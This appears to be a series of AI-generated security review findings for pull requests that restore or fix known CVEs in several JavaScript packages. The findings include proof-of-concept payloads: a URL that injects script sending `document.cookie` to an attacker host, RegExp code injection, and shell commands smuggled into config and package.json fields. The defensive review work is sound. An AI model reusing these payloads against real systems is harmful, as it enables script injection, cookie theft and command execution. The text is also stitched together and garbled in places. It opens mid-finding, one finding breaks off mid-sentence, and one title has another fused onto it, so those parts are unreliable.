The `client` object is never closed at all, and its network/console listeners stay registered. Nothing else reaps these targets — every request creates a fresh one with `CDP.New` (`src/renderer.js:178`, `:202`).

**Evidence:** a navigation failure rejects from `src/renderer.js:95-100` (or `Page.navigate(...).catch(reject)` at `:74`) and propagates to the `catch` at `:194`/`:222`, which reaches neither `CDP.Close` nor `client.close()`. The repo's own tests show this path fires for ordinary bad input: `/render/abc` and `/render/http://unknown.blah.com` return 400 (`test/app-test.js:136-146`), and 400 can only come from a rejection (`src/main.js:102-107`) since a timeout resolves 200 (`src/renderer.js:121`). `chrome-launcher` only kills Chrome on `/_ah/stop` or after repeated uncaught errors (`src/main.js:136-139`, `:164-181`), and there is no idle-target reaping, tab reuse, or connection limit.

**Impact:** an unauthenticated caller can repeat any failing URL and grow Chrome renderer processes and open file descriptors without bound (roughly one per request, up to the process's `nofile` limit). When the browser can no longer create targets, all rendering stops — a service-wide denial of service from ordinary requests. Upstream fixed this in `ccb520c` by closing the connection in both `catch` blocks.

**Fix:** run the target/connection cleanup in a `finally` (await `CDP.Close`, and close the client), including on the reject path.

findings.title: Request URL is interpolated into evaluated JavaScript, so a quote in the URL runs script in the page
findings.body:
The caller-supplied URL is pasted into a JavaScript source string and evaluated in the page: `Runtime.evaluate({expression: `(${injectBaseHref.toString()})('${url}')`})` (`src/renderer.js:187`). A URL containing a single quote breaks out of the string literal, so the rendered page executes attacker-chosen script.

**Preconditions:** the request URL contains `'` (raw, or percent-encoded and decoded by Express).

**Evidence:** `src/renderer.js:187`; the URL is the raw `request.params.url` (`src/main.js:99`). A benign URL such as `http://host/it's` produces a `SyntaxError`, so `injectBaseHref` never runs and the base tag is silently dropped. A crafted URL such as `http://allowed/x');fetch('https://attacker/'+document.cookie);//` produces a valid expression, and that script runs in the rendered page's origin after `stripPage` has removed the page's own scripts (`src/renderer.js:185-187`).

**Impact:** script runs with the page origin's privileges after the page's own script tags were stripped, bypassing the page's CSP, and the actor controls what that script does (read page state, issue same-origin requests). The practical gain is limited — the caller already receives the serialized DOM — so this is reported as a code-injection defect, not a privilege escalation.

**Fix:** pass the URL as data instead of source, e.g. `Runtime.callFunctionOn` with an argument object, or `injectBaseHref(${JSON.stringify(url)})`.

findings.title: Errors thrown before the try block leave the request pending forever
findings.body:
`serialize`, `captureScreenshot` and `_loadPage` wrap their bodies in `new Promise(async(resolve, reject) => …)` (`src/renderer.js:42`, `:177`, `:201`). With an async executor, a rejection from any `await` that sits outside the `try` block is not delivered to `reject` — it becomes an unhandled rejection, and the returned promise never settles, so the HTTP request never gets a response.

**Preconditions:** a DevTools call or connection step fails — Chrome has died, target creation fails after descriptors are exhausted (see the tab-leak finding), or the installed Chrome lacks a method the code calls (`Emulation.setVisibleSize` at `src/renderer.js:214` and `Page.addScriptToEvaluateOnLoad` at `:60-66` were removed/deprecated in later Chrome versions; the Dockerfile installs unpinned `google-chrome-stable`).

**Evidence:** the awaits at `src/renderer.js:45-51`, `:178-179`, `:209`, `:213-214` run before the `try` at `:183`/`:216`/`:185`; `CDP.New`/`CDP` failures escape the executor. The express handler awaits `renderer.serialize(...)` (`src/main.js:99`, `:118`), so no response is ever written. The unhandled rejection reaches `logUncaughtError` (`src/main.js:164-181`), which kills Chrome and calls `process.exit(1)` once five have accumulated.

**Impact:** requests hang until the caller times out instead of returning an error, and five such failures take the whole instance down. Severity is kept low because the trigger is a Chrome-side failure rather than attacker input alone.

**Fix:** move all awaited setup inside the `try` (or drop the `new Promise` wrapper and use an async method so throws reach the caller).

summary:
The PR adds `index.js` (the whole file is new) as the fix for CVE-2019-16769. I compared it against the released 2.1.0 and 2.1.1 packages: it matches 2.1.1 in every place except the RegExp branch at `index.js:191`, where the regexp source is concatenated into a double-quoted literal instead of being passed through `serialize()`. I reproduced the consequence in node (a `new RegExp('"+(global.PWNED=1)+"')` payload executes on `eval` of the serialized output) and confirmed the backslash-corruption side effect, which the bundled suite already catches.

The remainder of the file is identical to the upstream fix, so the escaping, placeholder, function and Map/Set paths carry no additional delta to review. One finding recorded (`high`, `index.js:191`); CI is red on this branch because the regexp output format changed without updating `test/unit/serialize.js`.

findings.title: RegExp sources are spliced unescaped into a string literal, letting attacker-controlled regexes inject code
findings.body:
A RegExp source is pasted raw inside a double-quoted JavaScript string literal, so a source that
contains `"` breaks out of the literal and the serialized output becomes attacker-chosen JavaScript.

`index.js:191` builds the replacement text by string concatenation:

```js
return "new RegExp(\"" + regexps[valueIndex].source + "\", \"" + regexps[valueIndex].flags + "\")";
```

The HTML/line-terminator escaping at `index.js:174-176` runs on the JSON text *before* the
placeholders are substituted, so regexp text never passes through `UNSAFE_CHARS_REGEXP` and is never
quoted or backslash-escaped either. Any application that serializes a RegExp derived from untrusted
input (`new RegExp(req.query.q)`, a regexp stored in user data, etc.) hands the attacker a
JavaScript injection point.

**Preconditions:** the caller serializes a RegExp whose `source` is attacker-influenced. This is the
same precondition the advisory for this CVE describes; no non-default option (`unsafe`) is needed.

**Evidence:** with the candidate `index.js`:

```js
var s = require('./index.js');
var re = new RegExp('"+(global.PWNED=1)+"');   // a valid regexp: /"+(global.PWNED=1)+"/
var out = s({re: re});
// {"re":new RegExp(""+(global.PWNED=1)+"", "")}
eval('(' + out + ')');                          // global.PWNED === 1
```

The same interpolation also silently corrupts ordinary regexps, because backslashes are consumed by
the JavaScript string literal it is spliced into:

```js
eval(s(/^\d+$/)).source   // '^d+$'   (expected '^\\d+$')
eval(s(/a"b/))            // SyntaxError: missing ) after argument list
```

This is a regression against the released fix: 2.1.1 emits
`new RegExp(" + serialize(regexps[valueIndex].source) + ", "<flags>")`, which JSON-quotes the source
and applies `escapeUnsafeChars`, so both the injection and the backslash loss disappear. The bundled
suite already catches the corruption half (`test/unit/serialize.js:292`), and `npx mocha test/unit`
is red on this branch (7 failing, 5 of them the intended `/re/` -> `new RegExp("re", "")` format
change that the patch did not reflect in the tests).

**Impact:** high. The library's documented main use is embedding the output in a `<script>` element,
where the injected code runs in a victim's browser session (XSS). It also corrupts every regexp that
uses backslash escapes, changing match semantics without any attacker involved.

**Fix:** restore the released fix — pass the source through the existing serializer so it is
JSON-quoted and unsafe-character escaped, e.g.
`return "new RegExp(" + serialize(regexps[valueIndex].source) + ", \"" + regexps[valueIndex].flags + "\")";`
and align the regexp expectations in `test/unit/serialize.js`.

summary: **Summary.** The change adds `lib/main.js`, the CLI library behind `aws-lambda` (`lambda deploy|delete|invoke|start`), at the version that fixes CVE-2019-10777: it rejects `FunctionName` values outside a strict alphanumeric regex at `lib/main.js:139` before the name reaches the `exec`-built zip command. I verified the fix holds — shell metacharacters, newlines, and `/` are all rejected, and the name is defaulted from the config-file name *before* validation, so the file-name path is covered too. The residual weakness is the sibling operand: `package.json`'s `files` list is joined and interpolated into the same shell string unquoted (`lib/main.js:185-192`), which still executes commands (confirmed by reproduction) and also breaks `:$LATEST` names and filenames with spaces. I also refuted a suspected `tagResource` misbinding at `lib/main.js:300`: both `UpdateFunctionConfiguration` and `UpdateFunctionCode` return `FunctionArn`, so the wrong `data` is harmless. Two findings recorded; the rest of the file's rough edges look like pre-existing upstream quality issues rather than part of this fix.

findings.title: Shell injection from the deployed folder's package.json files list in the zip command
findings.body:
The zip command for a deploy is assembled as a shell string and run through
`child_process.exec`, which means `/bin/sh -c`. The function-name operand is now
validated; the file-list operand is not, so shell metacharacters in the deployed
folder's `package.json` still run as commands on the deploy host.

**Preconditions:** the deployed function directory (the `PATH` folder, after
`process.chdir` at `lib/main.js:174`) has a `package.json` whose `files` array is used
as the zip input list. Normal single-developer use is unaffected; the risk appears
when the folder is authored by someone other than the person running the deploy
(e.g. CI deploying a repository that contributors can change).

**Evidence:** `lib/main.js:184-190` joins `files` with spaces and interpolates the
result unquoted into `"zip -r -9  " + tmpfile + " " + zipfileList`, then executes it at
`lib/main.js:192`. The validation added at `lib/main.js:139` only guards
`FunctionName`. Reproduction with `files: ["my file.js", "$(touch /tmp/p_dollar)",
"index.js; touch /tmp/p_semi"]`:

```
CMD: zip -r -9 /tmp/ztest/myfn:$LATEST-123.zip my file.js $(touch /tmp/p_dollar) index.js; touch /tmp/p_semi
/tmp/p_dollar  /tmp/p_semi        # both payloads executed
```

The same test shows two further consequences of the missing quoting: `$LATEST` is
expanded to empty (`/tmp/ztest/myfn:-123.zip`), and `my file.js` is split into two
arguments. Because `exec` reports the exit status of the last command in the chain,
an injected trailing command also masks a failing `zip` — the `err` check at
`lib/main.js:194` does not fire.

**Impact:** whoever controls the deployed folder's `package.json` can run arbitrary
commands as the user running the deploy, which is where the AWS credentials and
`~/.aws` live. That function code itself never runs locally, so this is an escalation
above contributing function code — but only in setups where the deployer and the
folder author differ, so severity is `low`. The quoting bug also breaks legitimate
deploys with `FunctionName: name:$LATEST` (accepted by the `lib/main.js:139` regex,
zip writes `/tmp/name:-<ts>.zip` while `lib/main.js:198` reads
`/tmp/name:$LATEST-<ts>.zip` → ENOENT) and with file names containing spaces.

**Fix:** stop building a shell string. Run `spawn('zip', ['-r', '-9', tmpfile].concat(files))`
in the already-chdir'd function directory (or quote every argument with a real shell
escaper). One change removes the injection and the `$LATEST`/space breakage.

findings.title: Malformed .lambda file throws TypeError in the catch block instead of reporting the parse error
findings.body:
A malformed `.lambda` file makes `lambda deploy` throw an uncaught `TypeError` instead
of printing the intended "Invalid config file" message, and the `exitOnError` setting
is never honoured on that path.

**Evidence:** `lib/main.js:121` reads `_this.settings`, but `var _this = this` is only
assigned much later, at `lib/main.js:153`. `var` is hoisted, so at the time the
`catch` at `lib/main.js:119-124` runs, `_this` is `undefined` and
`_this.settings` throws `TypeError: Cannot read properties of undefined (reading
'settings')`. The `console.log('Invalid config file ...')` on the previous line is
reached, but the helpful message and the `process.exit(-1)` branch are not.

**Impact:** only the error path, and the process still exits non-zero with a stack
trace; the user loses the intended diagnostic message. `info`.

**Fix:** use `this.settings` at `lib/main.js:121`, matching
`lib/main.js:_parse_config_file`'s handling (or move `var _this = this` above the
parse block).

summary:
The PR re-adds `simplehttpserver/simplehttpserver.js` (177 lines) in its post-fix form, identical to upstream commit `d85f8cf` "Dont return paths outside webroot": it adds a `..`-segment regex reject (`:66`) plus a `path.relative` containment check against `webroot` (`:73-78`) before joining user paths. I started the server against a scratch webroot and tried a dozen traversal payloads with `--path-as-is` (literal `../`, `%2e%2e`, `%2f`, `%5c`, `....//`, `..;/`, absolute paths): all return 404, so the CVE-2018-16478 traversal is closed for the POSIX code path this runs on.

One defect survived in the newly added code: the directory-listing worker calls `cb()` without returning on a failed `fs.stat`, so it then dereferences `undefined` and kills the process; a delegate reproduced this independently (dangling symlink in an index-less directory → server exits, `GET` gets an empty reply). Recorded as `low`.

Overall: the security fix is correct and should be approved; the remaining crash is an availability bug inherited with the re-added file, with a one-character fix.

findings.title: Failed stat in directory listing crashes the whole server process
findings.body:
A directory-listing request can terminate the whole server process. In the
`async.queue` worker at `simplehttpserver/simplehttpserver.js:142-153`, the
`fs.stat` error path calls `cb()` without `return`, then falls through to
`stat.isDirectory()`. When `stat` is undefined (`ENOENT`, `ELOOP`, …) that throws a
`TypeError` inside a libuv `FSReqCallback` frame, so nothing in express or async
catches it and Node exits with code 1.

**Preconditions:** the requested directory has no `index.html` (so `express.static`
falls through to the catch-all handler at `:57`) and contains an entry that cannot be
stat'd, typically a dangling or looping symlink. The path is triggered by any
unauthenticated `GET /<dir>/`; the unstatable entry itself must already exist in the
served tree, since the server exposes no write path.

**Evidence:** reproduced against the checked-out tree after `npm install`:
webroot with `sub/ok.txt` and `sub/broken -> /nonexistent`, `node simplehttpserver.js
-p 8124 /tmp/wr2/pub`, then `curl --path-as-is http://127.0.0.1:8124/sub/` returns
`000`/empty reply and the process log ends with
`simplehttpserver.js:147 if ( stat.isDirectory() ) { TypeError: Cannot read
properties of undefined (reading 'isDirectory') at FSReqCallback.oncomplete`. Requests
to `/sub/index.html` and `/sub/broken` stay alive; only the listing request kills the
process. If the unstatable entry happens to finish last, `q.drain` fires first and the
client even receives a complete 200 listing before the process dies — the crash is
independent of what the client sees.

**Impact:** one unauthenticated request takes the server down for every user until it
is restarted (recoverable), and the trigger is a file-tree condition the server cannot
cause itself — a broken symlink in a dev tree is ordinary for a tool documented as a
"testing and development tool". `low`.

**Fix:** restore the invariant "the worker calls `cb` exactly once and never touches a
missing stat": `if (!stat) return cb();`. That both prevents the throw and stops the
duplicate `cb()` call that follows. Optionally also guard the `q.drain`/`sendHTML`
path against a second invocation.

summary:
Review complete; four findings recorded.

The change adds `index.js`, the full implementation of `serialize-javascript` 2.1.0 — JSON serialization extended with RegExp, Date, Map, Set, function and `undefined` support, plus an HTML-unsafe-character escape pass. The escaping model is the weak point: it runs on the JSON text before RegExp and function sources are spliced back in, so those sources reach the page raw (the CVE-2019-16769 XSS, which upstream fixed in 2.1.1 for RegExps only). Function-form detection in `serializeFunc` also emits unparsable JavaScript for shorthand methods that use callbacks and for class values, and `ignoreFunction` mutates the caller's object. The existing suite (61 tests) passes and exercises none of these paths; I recorded the escaping gap as medium and the rest as low/info.

findings.title: Serialized RegExp sources bypass the HTML-escaping pass and can break out of an inline script
findings.body: `serialize()` promises (README, and the comment at `index.js:171-173`) that HTML-unsafe characters are escaped so the output can be embedded in a `')` gives `"\u003C\u002Fscript\u003E"`), so the two paths disagree. The raw text changes how the page parses. With a standard `` page, feeding `{r:/

findings.title: Shorthand methods whose body uses a callback serialize to syntax-invalid JavaScript
findings.body:
Object method shorthand whose body contains `function(` or `=>`, and class values, are emitted without the `function` keyword rewrite, so `serialize()` returns JavaScript that does not parse.

**Evidence:** `serializeFunc` (`index.js:108-143`) picks the output form with two unanchored substring tests that run before the method rewrite: `IS_PURE_FUNCTION = /function.*?\(/` (`index.js:14`) and `IS_ARROW_FUNCTION = /.*?=>.*?/` (`index.js:15`). A shorthand method whose body happens to call a callback short-circuits at `index.js:115-122` and returns the raw method text `m(){...}`, which is only valid as an object-literal property, not as a standalone value. Class values fall through to the rewrite at `index.js:124-139`, which drops the `class ... {` prefix but keeps the closing brace.

```
$ node -e 'var s=require("./index.js");
  console.log(s({a:({m(){return [1,2].map(x=>x*2);}}).m}));
  console.log(s({a:({m(){return (function(){return 1})();}}).m}));
  console.log(s({a:class A{constructor(){this.x=1;}}}));'
{"a":m(){return [1,2].map(x=>x*2);}}         SyntaxError: Unexpected token '{'
{"a":m(){return (function(){return 1})();}}  SyntaxError: Unexpected token '{'
{"a":function(){this.x=1;}}}                 SyntaxError: Unexpected token '}'
```

All three throw when evaluated with `new Function`. A plain method (`{m(){return 1;}}`) and a normal function serialize correctly, so the failure depends on incidental body text.

**Impact:** Any value carrying a shorthand method that uses a callback — common in object literals passed through a state serializer — produces a string that throws `SyntaxError` when deserialized, so the page fails instead of receiving its state. Contained to the affected value; the caller can work around it, and the existing unit tests never serialize such a method.

**Fix:** Choose the rewrite by inspecting the leading token of the source (or by parsing the parameter list) instead of matching `function(`/`=>` anywhere in the body, and reject class values, which cannot be expressed as a function.

findings.title: ignoreFunction deletes properties from the caller's object during serialization
Native-function rejection skips alternate calls due to global regexp state
findings.body:
The check that rejects native functions is skipped on every other call, so a native function can be serialized as `function max() { [native code] }`, which is not valid JavaScript.

**Evidence:** `IS_NATIVE_CODE_REGEXP` is a `/g` regexp used with `.test()` (`index.js:13`, `index.js:110`). A successful match advances `lastIndex`; the `throw` at `index.js:111` means nothing resets it, and the next call starts scanning from the middle of the string and misses.

```
$ node -e 'var s=require("./index.js");
  for (var i=0;i<4;i++) { try { console.log(i, s({a: Math.max})); }
    catch(e) { console.log(i, "threw:", e.message); } }'
0 threw: Serializing native function: max
1 {"a":function max() { [native code] }}
2 threw: Serializing native function: max
3 {"a":function max() { [native code] }}
```

`new Function` on the output throws `SyntaxError`. The same state is armed by any user function whose source merely contains the text `{ [native code] }` (the regexp is unanchored), which is an easy way to make a later native function slip through.

**Impact:** The documented protection against serializing native code fails intermittently in the same process, producing output that throws on the client instead of raising the intended `TypeError` at serialization time. Contained to the affected value and cleared by the alternating state, so severity is informational.

**Fix:** Use a non-global regexp (drop the `g` flag) or reset `IS_NATIVE_CODE_REGEXP.lastIndex = 0` before each `.test()`.

summary:
## Review: PR #1 — Add `index.js` (kind-of CVE-2019-20149 fix)

**What the change does.** It adds `index.js` (129 lines), which is the package's `main` and was missing from the baseline. The only behavioural difference from the committed `browser.js` bundle is `ctorName`, `index.js:68-70`: `val.constructor.name` is now only read when `typeof val.constructor === 'function'`, so an attacker-supplied `constructor` value can no longer steer the type result. I confirmed the file is byte-identical to the upstream fix commit `1df992c`, which npm/OSV list as the 6.0.3 fix for CVE-2019-20149 (GHSA-6c8f-qphg-qjgp, "Validation Bypass").

**Verification.**
- Bypass before/after: `kindOf({constructor: {name: 'Set'}})` returns `set` with 6.0.2 and `object` with the added file; same for `constructor: null/undefined/1/'x'/Symbol` — none throw.
- No regressions: full mocha suite (36 tests, including `test/es6`) passes under Node with the new file; cross-realm objects (`vm` contexts), `Object.create(null)`, Arrays, Dates, RegExps, Buffers and generators all classify correctly.
- Residual, accepted limitation: a function-valued constructor (`kindOf({constructor: function Set(){}})`) still returns `set`. This is inherent to the upstream fix and not reachable from JSON/serialized attacker input (which cannot carry functions), so it is below reporting threshold.

**Non-blocking observation.** The committed `browser.js:69-71` still contains the pre-fix `val.constructor ? val.constructor.name : null`. It is a build artifact, excluded from the npm tarball (`package.json` `files`), not referenced by a `browser` field, and regenerated by `prepublish`; it was already stale before this change, so it is not a regression and I did not file it. Consider regenerating it in the same commit for consistency.

**Assessment:** the change is the canonical fix, is minimal, and closes the reported bypass without altering legitimate type results. No findings recorded.

The change re-adds `lib/main.js`, the 561-line core of the `aws-lambda` CLI (deploy/delete/invoke/start, plus a Docker wrapper). It is the pre-fix revision of CVE-2019-10777: the `zip` step is assembled by string concatenation from the `.lambda` config's `FunctionName` and the project's `package.json` `files`, then run through `child_process.exec`, which gives shell command execution to anyone who can supply those files — reproduced end to end against this commit. I also recorded a smaller error-path defect where an unparsable config crashes `start` with an unrelated `TypeError` and defeats `exitOnError: false`. The Docker path uses `spawn` with an argv array and is sound; the remaining surfaces (YAML loading with a custom `!Ref` schema, watchpack wiring, duplicated config parsing across commands, unpinned `aws-sdk`) produced no further reportable failure beyond those two.

findings.title: Untrusted .lambda config or package.json runs shell commands during deploy
findings.body:
`lambda deploy` / `lambda start` build a `zip` command by string concatenation from the
`.lambda` config and the deployed project's `package.json`, then run it through
`child_process.exec`. A crafted config or `package.json` runs arbitrary shell commands as
the developer, before any AWS API call.

**Preconditions:** the victim runs `lambda deploy <config>` or `lambda start <config>`
(bin/lambda:13, bin/lambda:52 → lib/main.js:480, :520) inside a project whose `.lambda`
config or `package.json` they do not fully control — a cloned repo, a template, a shared
config. The directory named by `PATH` must exist (lib/main.js:163-166). No AWS
credentials are needed: the shell command runs at :187, before `createFunction` at :235.

**Evidence:**

- lib/main.js:3 imports `child_process.exec`; lib/main.js:187 calls
  `exec( $zipCmd, ... )`.
- lib/main.js:185 builds the command: `"zip -r -9  " + tmpfile + ' ' + zipfileList`.
- `tmpfile` (:150) contains `$config.FunctionName` straight from the YAML parsed at
  :112-118; nothing validates it, and lib/schema.js only adds a `!Ref` type.
- `zipfileList` (:177-181) is `package.json`'s `files` array joined with spaces.

Reproduced against this commit with `aws-sdk` stubbed (so only the exec path runs):

1. `FunctionName: "evil; id > /tmp/rce_id.txt #"` in the config →
   `/tmp/rce_id.txt` contained `uid=0(root) gid=0(root) ...`, and the deploy then died on
   `readFileSync('/tmp/evil; id > /tmp/rce_id.txt #-<ts>.zip')`, which shows the raw
   interpolation.
2. `{"files":["index.js","; id > /tmp/rce_pkg.txt; #"]}` in the project `package.json`
   with a benign `FunctionName: benign-fn` → `/tmp/rce_pkg.txt` contained the same `id`
   output. This variant can complete with a normal "Deployed!" message.

A plain `FunctionName` (`benign-fn`, `my-plain-function`) deploys normally, so the bug is
not an artifact of making the input malicious.

**Impact:** arbitrary command execution as the developer's user, who by design has the
AWS key/secret from the same config in `aws.config` (:139-143) — credentials, source and
anything else in reach. High: it crosses a trust boundary (project content → developer
machine and cloud account) and the effect is permanent. `FunctionName` is also used
unnormalized in `path.join(os.tmpdir(), ...)` (:150) and later `fs.unlinkSync(tmpfile)`
(:233), so a value with `../` writes and deletes outside the temp directory.

**Fix:** never hand a concatenated string to a shell. Use `execFile`/`spawn` with an argv
list — `execFile('zip', ['-r','-9', tmpfile].concat(zipfileList))` — and validate
`FunctionName` against `^[A-Za-z0-9_.-]+(:[A-Za-z0-9_.-]+)?$` before it reaches
`tmpfile`. Validating the name alone leaves the `package.json` `files` path open.

findings.title: Invalid .lambda config crashes start with a TypeError instead of the parse error
findings.body:
`lambda start <file>` on a config that does not parse (bad YAML, a missing `PATH`) dies
with an unrelated `TypeError` instead of the parse error, and `exitOnError: false` never
takes effect.

**Evidence:** two independent faults on that path.

- `deploy` reads `_this.settings` at lib/main.js:121, but `var _this = this` is only at
  :148 — hoisted, so `_this` is `undefined` in the `catch`. `start` creates its deployer
  with `{ exitOnError: false }` (:464), so the guard at :121 is exactly the branch it
  hits.
- `_parse_config_file` returns `undefined` on a parse failure when `exitOnError` is
  `false` (:64), and `start` then dereferences it at :484 (`folders = [config.PATH]`) and
  :488.

Reproduced against this commit: with a config containing a tab-indented flow mapping,
`l.deploy('bad')` threw `TypeError: Cannot read properties of undefined (reading
'settings')`, `_parse_config_file('bad')` printed the YAML error and returned `undefined`,
and reading `.PATH` off it threw `TypeError: ... (reading 'PATH')`. A config that parses
but omits `PATH` crashes the same way inside `_parse_config_file` (:77) and `deploy`
(:154), also outside any `try`.

**Impact:** the local CLI aborts with a stack trace that names no config problem, and the
watcher mode's whole resilience setting is bypassed. Contained and transient — rerunning
after fixing the file works. `info`.

**Fix:** declare `var _this = this` before the `try` in `deploy` (or use `this` in the
`catch`), and have `start` stop when `_parse_config_file` returns `undefined` instead of
continuing to `config.PATH`.

summary:
The PR adds back `index.js`, which is byte-identical to the published `kind-of@6.0.2` source — the version affected by CVE-2019-20149.

**Finding (medium):** `ctorName` at `index.js:69` uses `val.constructor ? val.constructor.name : null`, so a value with a non-function `constructor` (`{"constructor":{"name":"Set"}}`) is classified as `'set'` instead of `'object'`, and the `[object Object]` branch is skipped. I verified the released 6.0.3 tarball differs from this file by exactly the one-line `typeof val.constructor === 'function'` guard, and reproduced the spoof against both versions.

I delegated a probe over the other helpers (`isArguments` catch block, `isBuffer`/`isDate`/`isError`/`isRegexp` duck typing, `isGeneratorFn` arity, `Symbol.toStringTag` fallback). Its leads are all either benign (the arity mismatch is dead code) or behaviours that still exist unpatched in 6.0.3 and later, so I reported none of them and recorded that reasoning in a new security knowledge concept.

One note for the fix: `browser.js` is a committed, byte-identical build of `index.js` and would need the same change.

findings.title: Crafted constructor property makes kindOf misreport a plain object's type (CVE-2019-20149)
findings.body:
`kindOf` trusts any truthy `val.constructor` and reads `.name` from it, so an
attacker-controlled value can claim to be a built-in type. A plain object such as
`{"constructor": {"name": "Set"}, "payload": 1}` is reported as `'set'`, not
`'object'`. This is the pre-6.0.3 implementation, i.e. CVE-2019-20149 /
GHSA-6c8f-qphg-qjgp ("Validation Bypass in kind-of").

**Preconditions:** a consumer passes attacker-influenced data (parsed JSON, request
body, config) to `kindOf` and branches on the answer. No special setup needed.

**Evidence:** `index.js:69` — `return val.constructor ? val.constructor.name : null;`
feeds `switch (ctorName(val))` at `index.js:23`, which maps any of `Symbol`,
`Promise`, `Map`, `Set`, `WeakMap`, `WeakSet` and the typed-array names to that
label. Reproduction:

```js
var kindOf = require('./index.js');
var evil = JSON.parse('{"constructor": {"name": "Set"}, "payload": 1}');
kindOf(evil);            // 'set'   (upstream 6.0.3 returns 'object')
kindOf({constructor:{name:'Symbol'}});   // 'symbol'
```

Upstream fixed this in 6.0.3 (commit 1df992c) by requiring
`typeof val.constructor === 'function'`; the released 6.0.3 tarball differs from
this file only on that one line. The committed browser bundle `browser.js:69`
carries the same code.

**Impact:** the library's core contract — reporting the real type of a value — is
bypassable at will by the value's owner, and the bogus label also suppresses the
`'[object Object]'` branch at `index.js:55`. Consumers that use `kindOf` as an
allow-list (`kindOf(x) === 'object'`) or as a gate before type-specific handling
get a wrong answer for exactly the inputs an attacker chooses, letting the value
skip plain-object validation and later be read as an ordinary object. Severity is
`medium`: the misclassification is deterministic and re-triggerable, but the harm
lands in a downstream consumer (no privileged operation exists in this repo), so
it is discounted one tier from the advisory's boundary-crossing rating.

**Fix:** resolve the constructor only when it is a function, and treat anything
else as "no constructor name":

```js
function ctorName(val) {
  return typeof val.constructor === 'function' ? val.constructor.name : null;
}
```

Apply the same change to `browser.js`, and note that fixing this requires the
package version to move past 6.0.2 (it is still `6.0.2` in `package.json:4`).

summary:
Recorded one finding. Summary:

The change adds `src/ui/input/checkbox_input.jsx`, the sign-up checkbox renderer for `additionalSignUpFields` fields of `type: "checkbox"`. The component is wired correctly into `CustomInput` and passes props through, but it renders the field's `placeholder` with `dangerouslySetInnerHTML` — the exact pre-fix form this component had before auth0/lock 11.21.0, which is the CVE-2019-20174 XSS. I confirmed the sink is reachable from `additionalSignUpFields[].placeholder` with only a non-empty-string check, and that the upstream fix (commit ec6fdab) instead escapes `placeholder` and gates HTML behind an explicit `placeholderHTML` prop.

Two smaller issues I checked and did not file: the `checked === 'true'` string compare is consistent with how the toggle path stores values, and the component ignoring `isValid`/`invalidHint` only degrades error feedback (the user can still tick the box to become valid). No other reachable defects found in the 29 added lines.

findings.title: Checkbox field placeholder renders as raw HTML, giving script injection from additionalSignUpFields
findings.body: `CheckboxInput` writes the `placeholder` string straight into the DOM with `dangerouslySetInnerHTML` (src/ui/input/checkbox_input.jsx:18). The value is whatever the Lock options contain at `additionalSignUpFields[].placeholder`; the only check it passes is "non-empty string" (src/connection/database/index.js:116), and nothing in the repo sanitizes it. A placeholder carrying markup such as `` runs as script in the page that hosts the widget. **Preconditions:** an integrator puts a value it does not fully control into the checkbox field's `placeholder`. That is the "untrusted placeholder" case this component was later fixed for (CVE-2019-20174 / GHSA-w2pf-g6r8-pg22: "Auth0 Lock before 11.21.0 allows XSS when additionalSignUpFields is used with an untrusted placeholder"). The same option is documented as plain text (README.md:507-518), and for the `text` and `select` types the same value is used as an escaped attribute, so moving a field to `type: "checkbox"` silently turns it into an HTML sink. **Evidence:** options flow to the sink unchanged: src/connection/database/index.js:116 (only non-empty-string check) → src/connection/database/index.js:202 → src/connection/database/index.js:402 → src/engine/classic/sign_up_pane.jsx:48 → src/field/custom_input.jsx:15 → src/field/custom_input.jsx:30-36 → src/ui/input/checkbox_input.jsx:18. Lock mounts embedded, not in an iframe: src/ui/box.js:10-14 appends the container to `document.body` and renders into it at src/ui/box.js:39, so injected script runs with the host page's origin, cookies, and `localStorage` (where auth0-js keeps tokens). The existing snapshot pins the sink: src/__tests__/field/__snapshots__/custom_input.test.jsx.snap:17 (`dangerouslySetInnerHTML: { "__html": "placeholder" }`). **Impact:** when the precondition holds, script from the field configuration executes in the origin of the page or hosted login page that shows the sign-up form, so an attacker who can influence that string can read or alter what every visitor of that form sees and submits. Reach is broad and crosses a trust boundary (data the integrator treats as label text becomes executable), persistence is recoverable (the payload lives in the config and fires on each render, no one-time interleaving needed), but it requires a non-default, integrator-side setup, so it lands at medium rather than high. **Fix:** treat `placeholder` as text, the way `text_input`/`select_input` do: `{placeholder}`. If HTML labels are still wanted for backwards compatibility, add an explicit `placeholderHTML` prop (as upstream 11.21.0 does at ec6fdab) and render HTML only from that prop, leaving `placeholder` escaped.

summary:
PR #1 adds `src/index.ts`, a 268-line TypeScript serializer whose output is meant to be embedded in a `<script>` tag and `eval`'d. The file is a verbatim copy of upstream devalue v1.1.1 (blob `429295c`), which is the commit that fixes CVE-2019-13506: object keys now pass through `escapeUnsafeChars` before being emitted, so a `<svg onload=…>` key can no longer break out of the script element. I confirmed that fix with reproduction, and I also recorded the gaps the file still has (RegExp values, symbols, `__proto__` keys, an empty shared `Set`/`Map` producing `a.;`), plus the fact that the PR leaves `test/test.ts` red because it does not update the `Dangerous key` expectation.

Overall the core change is correct and matches upstream, but it should not merge as-is: the test suite fails, and the RegExp path contradicts the library's stated XSS guarantee.

findings.title: A shared empty Set or Map emits invalid JavaScript (a.;)
findings.body:
A `Set` or `Map` that is referenced more than once is emitted as a bare
`new Set`/`new Map` plus chained statements built with an unconditional leading
dot (`src/index.ts:170-178`):

```ts
statements.push(`${name}.${Array.from(thing).map(v => `add(${stringify(v)})`).join('.')}`);
```

When the collection is empty the chain is empty, so the statement is just `a.`,
which is not valid JavaScript.

**Evidence:**

```js
const s = new Set();
devalue({ a: s, b: s })
// => (function(a){a.;return {a:a,b:a}}(new Set))
const m = new Map();
devalue({ a: m, b: m })
// => (function(a){a.;return {a:a,b:a}}(new Map))
```

Evaluating either output throws `SyntaxError: Unexpected token ';'`, so the whole
serialized state fails to load. Only same-instance sharing triggers it (two
distinct empty sets are never named), which is why the existing tests miss it.

**Impact:** a page whose state reuses a shared empty collection breaks completely
(low: contained to that page, fixed by changing the code).

**Fix:** skip the statement when the collection has no entries, e.g. append the
chain only if it is non-empty.

findings.title: RegExp state values are emitted unescaped, allowing </script> breakout
